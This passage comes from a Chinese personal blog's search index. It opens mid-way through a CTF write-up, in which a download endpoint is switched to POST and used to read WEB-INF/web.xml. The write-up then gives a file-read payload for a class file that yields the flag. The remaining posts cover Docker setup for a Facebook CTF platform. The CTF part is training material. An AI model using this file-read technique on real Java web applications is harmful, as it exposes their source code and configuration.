class="number">10.0</span><span class="string">;</span> <span class="string">Win64;</span> <span class="string">x64;</span> <span class="string">rv:69.0)</span> <span class="string">Gecko/20100101</span> <span class="string">Firefox/69.0</span></span><br><span class="line"><span class="attr">Accept:</span> <span class="string">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span><br><span class="line"><span class="attr">Accept-Language:</span> <span class="string">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="attr">Accept-Encoding:</span> <span class="string">gzip,</span> <span class="string">deflate</span></span><br><span class="line"><span class="attr">Connection:</span> <span class="string">close</span></span><br><span class="line"><span class="attr">Upgrade-Insecure-Requests:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">Pragma:</span> <span class="literal">no</span><span class="string">-cache</span></span><br><span class="line"><span class="attr">Cache-Control:</span> <span class="literal">no</span><span class="string">-cache</span></span><br></pre></td></tr></table></figure><p>通过查询发现要改成POST，得到许多有用信息</p><p><img src="/3.jpg"></p><p><code>com.Wm.ctf.DownloadController.doPost</code></p><p>这个信息跟CTF可能有关,记一下一般有这样都有泄露。</p><p><img src="/4.jpg"></p><h3 id="因为缺少JAVA项目的开发经验，所以查了大量的资料"><a href="#因为缺少JAVA项目的开发经验，所以查了大量的资料" class="headerlink" title="因为缺少JAVA项目的开发经验，所以查了大量的资料"></a>因为缺少JAVA项目的开发经验，所以查了大量的资料</h3><p>我们访问下WEB-INF&#x2F;web.xml这个文件</p><p><img src="/5.jpg"></p><p>得到了个flag的路径!!!!</p><h2 id="插入一个知识点"><a href="#插入一个知识点" class="headerlink" title="插入一个知识点"></a>插入一个知识点</h2><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">WEB-INF主要包含一下文件或目录:</span><br><span class="line">/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line">/WEB-INF/classes/：含了站点所有用的 <span class="class"><span class="keyword">class</span> 文件，包括 <span class="title">servlet</span> <span class="title">class</span> 和非<span class="title">servlet</span> <span class="title">class</span>，他们不能包含在 .<span class="title">jar</span>文件中</span></span><br><span class="line">/WEB-INF/<span class="class"><span class="keyword">lib</span>/：存放<span class="title">web</span>应用需要的各种<span class="title">JAR</span>文件，放置仅在这个应用中要求使用的<span class="title">jar</span>文件,如数据库驱动<span class="title">jar</span>文件</span></span><br><span class="line">/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</span><br><span class="line">/WEB-INF/database.properties：数据库配置文件</span><br><span class="line">漏洞检测以及利用方法：通过找到web.xml文件，推断<span class="class"><span class="keyword">class</span>文件的路径，最后直接<span class="title">class</span>文件，在通过反编译<span class="title">class</span>文件，得到网站源码</span></span><br></pre></td></tr></table></figure><h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload:"></a>构造payload:</h2><p><code>filename=WEB-INF/classes/com/wm/ctf/FlagController.class</code></p><p>base64解码得到flag</p><p><img src="/6.jpg"></p><h3 id="PS-GET不能读取文件有点懵，没想到居然要改成POST"><a href="#PS-GET不能读取文件有点懵，没想到居然要改成POST" class="headerlink" title="PS: GET不能读取文件有点懵，没想到居然要改成POST"></a>PS: GET不能读取文件有点懵，没想到居然要改成POST</h3>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Centos7搭建Facebook CTF平台（三）(ubuntu:14.04使用)</title>
      <link href="/2019/02/10/Centos7%E6%90%AD%E5%BB%BAFacebook-CTF%E5%B9%B3%E5%8F%B0%EF%BC%88%E4%B8%89%EF%BC%89-ubuntu-14-04%E4%BD%BF%E7%94%A8/"/>
      <url>/2019/02/10/Centos7%E6%90%AD%E5%BB%BAFacebook-CTF%E5%B9%B3%E5%8F%B0%EF%BC%88%E4%B8%89%EF%BC%89-ubuntu-14-04%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p><strong>进入ubuntu容器交互系统:</strong><br>    <del># docker run -i -t ubuntu &#x2F;bin&#x2F;bash</del><br>        # docker exec -it ubuntu &#x2F;bin&#x2F;bash</p><a id="more"></a><p><strong>进入ubuntu容器交互系统:</strong><br>    <del># docker run -i -t ubuntu &#x2F;bin&#x2F;bash</del><br>        # docker exec -it ubuntu &#x2F;bin&#x2F;bash</p><p><strong>当试图直接使用 apt-get 安装一个软件的时候，会提示 E: Unable to locate package。</strong></p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@<span class="number">543356</span>e8a428:/<span class="comment"># apt-get install git</span></span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree       </span><br><span class="line">Reading <span class="keyword">state</span> information... Done</span><br><span class="line">E: Unable <span class="keyword">to</span> locate package git</span><br></pre></td></tr></table></figure><p>这并非系统不支持 apt-get 命令。Docker 镜像在制作时为了精简清除了 apt 仓库信息，因此需要先执行 apt-get update 命令来更新仓库信息。更新信息后即可成功通过 apt-get 命令来安装软件。</p><p>我发现我之前安装的ubuntu并不能后台运行</p><p>输入下面的代码，-d表示的就是后台运行，这点可以直接通过docker run –help查看该命令的功能。下面这句话的意思就是在镜像的程序中添加引号内的代码，并在后台运行。</p><p><del>docker run -d ubuntu:16.04 &#x2F;bin&#x2F;sh -c “while true; do echo hello world; sleep 1;done</del> </p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -d -p <span class="number">8080</span>:<span class="number">80</span> ubuntu:<span class="number">14.04</span> /bin/bash</span><br><span class="line">-d表示的就是后台运行、-p分配端口，把<span class="number">80</span>分配到服务器的<span class="number">8080</span></span><br><span class="line">/bin/bash的作用是因为docker后台必须运行一个进程，否则容器就会退出，在这里表示启动容器后启动bash。</span><br></pre></td></tr></table></figure><p>（不好意思，今天刚学习） </p><p>我说之前：docker ps -a 为什么没东西，发现好多次下载好fctf之后都得从新下一遍</p><p>如果我们想要进入后台运行的容器的命令行而不创建新的容器，只需要输入以下命令：</p><pre><code>#exec是进入已经存在的容器，run是创建新容器id可以先$ docker ps  得到  （长的ID）docker exec -it d90b2bdfc9d86657fd61363548b58abe20c1c2b673171852b19607154e8c6602 /bin/bash（短的ID）docker exec -it b45fab8d5eef /bin/bash</code></pre><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget http<span class="variable">s:</span>//mirrors.tuna.tsinghua.edu.<span class="keyword">cn</span>/HHVM/<span class="keyword">conf</span>/hhvm.gpg.key | sudo apt-key <span class="built_in">add</span> hhvm.gpg.key</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"deb https://mirrors.tuna.tsinghua.edu.cn/HHVM/ubuntu Trusty main"</span>&gt;&gt; sudo tee /etc/apt/sources.<span class="keyword">list</span>.d/hhvm.<span class="keyword">list</span></span><br><span class="line"></span><br><span class="line">sudo <span class="keyword">echo</span> <span class="string">"deb https://mirrors.tuna.tsinghua.edu.cn/HHVM/ubuntu/dists/ Trusty main"</span>&gt;&gt; sudo tee /etc/apt/sources.<span class="keyword">list</span>.d/hhvm.<span class="keyword">list</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Centos7搭建Facebook CTF平台（二）(配置加速镜像)</title>
      <link href="/2019/02/10/Centos7%E6%90%AD%E5%BB%BAFacebook-CTF%E5%B9%B3%E5%8F%B0%EF%BC%88%E4%BA%8C%EF%BC%89-%E9%85%8D%E7%BD%AE%E5%8A%A0%E9%80%9F%E9%95%9C%E5%83%8F/"/>
      <url>/2019/02/10/Centos7%E6%90%AD%E5%BB%BAFacebook-CTF%E5%B9%B3%E5%8F%B0%EF%BC%88%E4%BA%8C%EF%BC%89-%E9%85%8D%E7%BD%AE%E5%8A%A0%E9%80%9F%E9%95%9C%E5%83%8F/</url>
      
        <content type="html"><![CDATA[<p><strong>要理解docker，最核心的是理解三个概念，分别是：仓库（Registry）、镜像（image）和容器（Container）。</strong></p><a id="more"></a><h2 id="仓库（Registry）"><a href="#仓库（Registry）" class="headerlink" title="仓库（Registry）"></a>仓库（Registry）</h2><p><strong>所谓仓库，其实是个镜像仓库，里面有很多别人已经打包好的镜像，可以直接使用docker pull命令将仓库中的镜像拉到本地，默认的仓库Docker的官方仓库Docker Hub Registry。</strong></p><p><strong>因为墙的缘故，官方仓库的速度会比较慢，可以配一个官方的中国加速镜像，<br>可以使用阿里云的镜像加速。</strong></p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">配置镜像加速器</span><br><span class="line">针对Docker客户端版本大于 <span class="number">1.10</span><span class="number">.0</span> 的用户</span><br><span class="line"></span><br><span class="line">您可以通过修改daemon配置文件<span class="regexp">/etc/</span>docker/daemon.json来使用加速器</span><br><span class="line">sudo mkdir -p <span class="regexp">/etc/</span>docker</span><br><span class="line">sudo tee <span class="regexp">/etc/</span>docker/daemon.json &lt;&lt;-<span class="string">'EOF'</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"registry-mirrors"</span>: [<span class="string">"https://dcbtpkus.mirror.aliyuncs.com"</span>]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure><p>各个版本有不同的方法<br>具体地址：<a href="https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors" target="_blank" rel="noopener">阿里云</a></p><p>**</p><h2 id="配置好镜像加速器之后"><a href="#配置好镜像加速器之后" class="headerlink" title="配置好镜像加速器之后?"></a>配置好镜像加速器之后?</h2><p>**<br><strong>获取镜像</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="symbol">root@</span> ~]# docker pull ubuntu:<span class="number">14.04</span></span><br></pre></td></tr></table></figure><p>运行镜像：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="symbol">root@</span> ~]# docker run -it  \ubuntu:<span class="number">14.04</span> \bash</span><br><span class="line">注：-i是交互式操作 -t：终端</span><br></pre></td></tr></table></figure><p>删除镜像||容器<br>停止所有的container，这样才能够删除其中的images：</p><pre><code># docker stop $(docker ps -a -q)</code></pre><p>如果想要删除所有container的话再加一个指令：</p><pre><code># docker rm $(docker ps -a -q)</code></pre><p> 删除images，通过image的id来指定删除谁</p><pre><code># docker rmi &lt;image id&gt;</code></pre><p>要删除全部image的话</p><pre><code># docker rmi $(docker images -q)</code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Centos7搭建Facebook CTF平台（一）（搭建Docker）</title>
      <link href="/2019/02/10/Centos7%E6%90%AD%E5%BB%BAFacebook-CTF%E5%B9%B3%E5%8F%B0%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%88%E6%90%AD%E5%BB%BADocker%EF%BC%89/"/>
      <url>/2019/02/10/Centos7%E6%90%AD%E5%BB%BAFacebook-CTF%E5%B9%B3%E5%8F%B0%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%88%E6%90%AD%E5%BB%BADocker%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p><strong>Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的镜像中，然后发布到任何流行的 Linux或Windows 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。</strong><br>那Docker由什么组成呢， 包括三个基本概念:<br>        仓库（Repository）<br>        镜像（Image）<br>        容器(Container）**</p><a id="more"></a><p><strong>百度百科</strong>：<strong>Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的镜像中，然后发布到任何流行的 Linux或Windows 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。</strong></p><p><strong>那Docker由什么组成呢， 包括三个基本概念:<br>        仓库（Repository）<br>        镜像（Image）<br>        容器(Container）</strong></p><p><strong>我是服务器装的Centos7，linux 3.10 内核，docker官方说至少3.8以上，建议3.10以上。</strong></p><p>检查Centos内核</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@izuf6giff71ddv24k55jz ~]<span class="comment"># uname -a</span></span><br></pre></td></tr></table></figure><p>把yum包更新（可以忽略）</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="symbol">@izuf6giff71ddv24k55jz</span> ~]<span class="meta"># yum update</span></span><br></pre></td></tr></table></figure><p>安装需要的软件包， yum-util 提供yum-config-manager功能，另外两个是devicemapper驱动依赖的</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="symbol">@izuf6giff71ddv24k55jz</span> ~]<span class="meta"># yum install -y yum-utils device-mapper-persistent-data lvm2</span></span><br></pre></td></tr></table></figure><p>设置yum源</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@izuf6giff71ddv24k55jz ~]# yum-config-manager --<span class="built_in">add</span>-repo http<span class="variable">s:</span>//download.docker.<span class="keyword">com</span>/linux/centos/docker-<span class="keyword">ce</span>.repo</span><br></pre></td></tr></table></figure><p>可以查看所有仓库中所有docker版本，并选择特定版本安装<br>：<br>我的</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[<span class="symbol">root@</span>izuf6giff71ddv24k55z ~]# yum list docker-ce --showduplicates | sort -r</span><br><span class="line">Loading mirror speeds <span class="keyword">from</span> cached hostfile</span><br><span class="line">Loaded plugins: fastestmirror</span><br><span class="line">docker-ce.x86_64            <span class="number">18.03</span><span class="number">.1</span>.ce<span class="number">-1.</span>el7.centos             docker-ce-stable</span><br><span class="line">docker-ce.x86_64            <span class="number">18.03</span><span class="number">.0</span>.ce<span class="number">-1.</span>el7.centos             docker-ce-stable</span><br><span class="line">docker-ce.x86_64            <span class="number">17.12</span><span class="number">.1</span>.ce<span class="number">-1.</span>el7.centos             docker-ce-stable</span><br><span class="line">docker-ce.x86_64            <span class="number">17.12</span><span class="number">.0</span>.ce<span class="number">-1.</span>el7.centos             docker-ce-stable</span><br><span class="line">docker-ce.x86_64            <span class="number">17.09</span><span class="number">.1</span>.ce<span class="number">-1.</span>el7.centos             docker-ce-stable</span><br><span class="line">docker-ce.x86_64            <span class="number">17.09</span><span class="number">.0</span>.ce<span class="number">-1.</span>el7.centos             docker-ce-stable</span><br><span class="line">docker-ce.x86_64            <span class="number">17.06</span><span class="number">.2</span>.ce<span class="number">-1.</span>el7.centos             docker-ce-stable</span><br><span class="line">docker-ce.x86_64            <span class="number">17.06</span><span class="number">.1</span>.ce<span class="number">-1.</span>el7.centos             docker-ce-stable</span><br><span class="line">docker-ce.x86_64            <span class="number">17.06</span><span class="number">.0</span>.ce<span class="number">-1.</span>el7.centos             docker-ce-stable</span><br><span class="line">docker-ce.x86_64            <span class="number">17.03</span><span class="number">.2</span>.ce<span class="number">-1.</span>el7.centos             docker-ce-stable</span><br><span class="line">docker-ce.x86_64            <span class="number">17.03</span><span class="number">.1</span>.ce<span class="number">-1.</span>el7.centos             docker-ce-stable</span><br><span class="line">docker-ce.x86_64            <span class="number">17.03</span><span class="number">.0</span>.ce<span class="number">-1.</span>el7.centos             docker-ce-stable</span><br><span class="line"></span><br><span class="line">``</span><br><span class="line">命令：yum install docker-ce-版本号，我选的是<span class="number">17.12</span><span class="number">.1</span>.ce</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> [<span class="symbol">root@</span>izuf6giff71ddv24k55jz ~]# yum install docker-ce<span class="number">-17.12</span><span class="number">.1</span>.ce</span><br><span class="line"></span><br><span class="line">启动docker</span><br><span class="line"></span><br><span class="line">[<span class="symbol">root@</span>izuf6giff71ddv24k55jz ~]# systemctl start docker</span><br><span class="line"></span><br><span class="line">验证安装是否成功(有client和service两部分表示docker安装启动都成功了)</span><br></pre></td></tr></table></figure><h1 id="docker-version"><a href="#docker-version" class="headerlink" title="# docker version"></a># docker version</h1><pre><code>我的：Client: Version:17.12.1-ce API version:1.35 Go version:go1.9.4 Git commit:7390fc6 Built:Tue Feb 27 22:15:20 2018 OS/Arch:linux/amd64Server: Engine:  Version:17.12.1-ce  API version:1.35 (minimum version 1.12)  Go version:go1.9.4  Git commit:7390fc6  Built:Tue Feb 27 22:17:54 2018  OS/Arch:linux/amd64  Experimental:false</code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello Friend!(阅读须知)</title>
      <link href="/2018/06/20/Hello-friend/"/>
      <url>/2018/06/20/Hello-friend/</url>
      
        <content type="html"><![CDATA[<p id="div-border-top-red"><b>因为很多东西都是写给我自己看的，免得我自己忘记。所以很多东西会写的尽量详细。免得自己看不懂自己当时写的~~~</b>不喜欢勿喷</p>]]></content>
      
      
      
        <tags>
            
            <tag> 欢迎 </tag>
            
            <tag> happy </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
